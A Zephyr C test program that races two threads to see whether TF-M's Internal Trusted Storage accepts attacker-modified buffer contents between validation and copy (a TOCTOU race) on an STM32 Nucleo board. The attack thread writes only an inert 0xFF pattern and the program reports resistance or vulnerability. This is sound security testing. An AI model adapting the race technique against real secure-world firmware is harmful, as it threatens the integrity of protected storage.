#include <zephyr/kernel.h>
#include <zephyr/sys/printk.h>
#include <psa/crypto.h>
#include <psa/internal_trusted_storage.h>

/*
 * Experiment 9 -- TOCTOU on TF-M Shared Memory
 *
 * Goal: Exploit the race window between TF-M's pointer
 * validation (CHECK) and actual use of the buffer (USE).
 *
 * Attack model:
 *   Thread A (legitimate): calls psa_its_set() with
 *                          a valid buffer
 *   Thread B (attacker):   races to modify the same
 *                          buffer after validation
 *                          but before TF-M copies it
 *
 * If the race succeeds:
 *   TF-M stores attacker-controlled data in Secure ITS
 *   This is a data integrity violation
 *
 * If the race fails (TF-M is resistant):
 *   Stored data always matches original legitimate data
 *   Empirical proof of TOCTOU resistance
 */

#define ITS_KEY_ID       0x00000001U
#define BUFFER_SIZE      64
#define RACE_ITERATIONS  1000

/* Shared buffer between Thread A and Thread B */
static uint8_t shared_buffer[BUFFER_SIZE];

/* Legitimate data pattern */
static const uint8_t LEGIT_DATA[BUFFER_SIZE] = {
    [0 ... 63] = 0xAA
};

/* Attacker data pattern */
static const uint8_t ATTACK_DATA[BUFFER_SIZE] = {
    [0 ... 63] = 0xFF
};

/* Statistics */
static volatile int race_attempts   = 0;
static volatile int attack_wins     = 0;
static volatile int legit_wins      = 0;
static volatile int its_errors      = 0;
static volatile bool experiment_running = true;

/* Semaphore to synchronize thread start */
K_SEM_DEFINE(start_sem, 0, 1);

/* ── Thread A: Legitimate ITS writer ──────────────── */
void thread_a_entry(void *p1, void *p2, void *p3)
{
    psa_status_t status;
    uint8_t readback[BUFFER_SIZE];
    size_t readback_len;

    printk("[THREAD-A] Legitimate ITS writer started\n");
    k_sem_take(&start_sem, K_FOREVER);

    while (experiment_running) {
        /* Load legitimate data into shared buffer */
        memcpy(shared_buffer, LEGIT_DATA, BUFFER_SIZE);

        /*
         * TOCTOU window:
         * TF-M validates shared_buffer here (CHECK)
         * Thread B tries to modify it before TF-M
         * copies it to Secure storage (USE)
         */
        status = psa_its_set(
            ITS_KEY_ID,
            BUFFER_SIZE,
            shared_buffer,   /* pointer TF-M will validate */
            PSA_STORAGE_FLAG_NONE
        );

        if (status != PSA_SUCCESS) {
            its_errors++;
            continue;
        }

        /* Verify what was actually stored */
        status = psa_its_get(
            ITS_KEY_ID,
            0,
            BUFFER_SIZE,
            readback,
            &readback_len
        );

        if (status == PSA_SUCCESS) {
            race_attempts++;
            if (memcmp(readback, ATTACK_DATA, BUFFER_SIZE) == 0) {
                attack_wins++;
                printk("[!!!] TOCTOU SUCCESS! Attacker data stored"
                       " in TF-M ITS! Run: %d\n", race_attempts);
            } else if (memcmp(readback, LEGIT_DATA,
                              BUFFER_SIZE) == 0) {
                legit_wins++;
            }
        }
    }
}

/* ── Thread B: Attacker racing to corrupt buffer ──── */
void thread_b_entry(void *p1, void *p2, void *p3)
{
    printk("[THREAD-B] Attacker racing thread started\n");
    k_sem_give(&start_sem);

    while (experiment_running) {
        /*
         * Race to overwrite shared_buffer with attack
         * data between Thread A's validation and use.
         * No synchronization — pure race condition.
         */
        memcpy(shared_buffer, ATTACK_DATA, BUFFER_SIZE);

        /* Yield to increase race probability */
        k_yield();
    }
}

/* ── Stack definitions ───────────────────────────── */
#define STACK_SIZE 4096
#define PRIO_A     5
#define PRIO_B     5   /* Same priority — preemptive race */

K_THREAD_STACK_DEFINE(stack_a, STACK_SIZE);
K_THREAD_STACK_DEFINE(stack_b, STACK_SIZE);
struct k_thread thread_a, thread_b;

int main(void)
{
    psa_status_t status;

    printk("=== BOOT OK (Non-Secure World) ===\n");
    printk("==========================================\n");
    printk("  Experiment 9: TOCTOU on TF-M ITS       \n");
    printk("  Board: nucleo_l552ze_q (TF-M active)   \n");
    printk("  Iterations: %d races                   \n",
           RACE_ITERATIONS);
    printk("  Legit data:  0xAA x 64 bytes           \n");
    printk("  Attack data: 0xFF x 64 bytes           \n");
    printk("==========================================\n\n");

    /* Initialize PSA crypto */
    status = psa_crypto_init();
    if (status != PSA_SUCCESS) {
        printk("[ERROR] PSA crypto init failed: %d\n", status);
        return -1;
    }

    /* Remove any existing ITS entry */
    psa_its_remove(ITS_KEY_ID);

    printk("[MAIN] Starting TOCTOU race experiment...\n");
    printk("[MAIN] Thread A (legit) and Thread B (attacker)\n");
    printk("[MAIN] run at same priority — preemptive race\n\n");

    /* Spawn Thread A — legitimate writer */
    k_thread_create(&thread_a, stack_a,
        K_THREAD_STACK_SIZEOF(stack_a),
        thread_a_entry, NULL, NULL, NULL,
        PRIO_A, 0, K_NO_WAIT);

    /* Spawn Thread B — attacker */
    k_thread_create(&thread_b, stack_b,
        K_THREAD_STACK_SIZEOF(stack_b),
        thread_b_entry, NULL, NULL, NULL,
        PRIO_B, 0, K_NO_WAIT);

    /* Wait for RACE_ITERATIONS attempts */
    while (race_attempts < RACE_ITERATIONS) {
        k_sleep(K_MSEC(500));
        printk("[MAIN] Progress: %d/%d races | "
               "Attack wins: %d | Legit wins: %d\n",
               race_attempts, RACE_ITERATIONS,
               attack_wins, legit_wins);
    }

    experiment_running = false;

    k_thread_abort(&thread_a);
    k_thread_abort(&thread_b);

    /* ── Final Report ─────────────────────────── */
    printk("\n==========================================\n");
    printk("  Experiment 9: FINAL RESULTS            \n");
    printk("==========================================\n");
    printk("  Total race attempts : %d\n", race_attempts);
    printk("  Legit data stored   : %d\n", legit_wins);
    printk("  Attack data stored  : %d\n", attack_wins);
    printk("  ITS errors          : %d\n", its_errors);

    if (attack_wins == 0) {
        printk("\n  RESULT: TF-M RESISTANT to TOCTOU\n");
        printk("  Attacker data NEVER stored in ITS\n");
        printk("  TF-M copies buffer atomically in\n");
        printk("  Secure world -- race window closed\n");
    } else {
        printk("\n  RESULT: !! TOCTOU VULNERABILITY !!\n");
        printk("  Attacker data stored %d/%d times\n",
               attack_wins, race_attempts);
        printk("  TF-M ITS data integrity compromised!\n");
    }

    printk("==========================================\n");
    printk("[MAIN] Experiment 9 COMPLETE.\n");

    return 0;
}
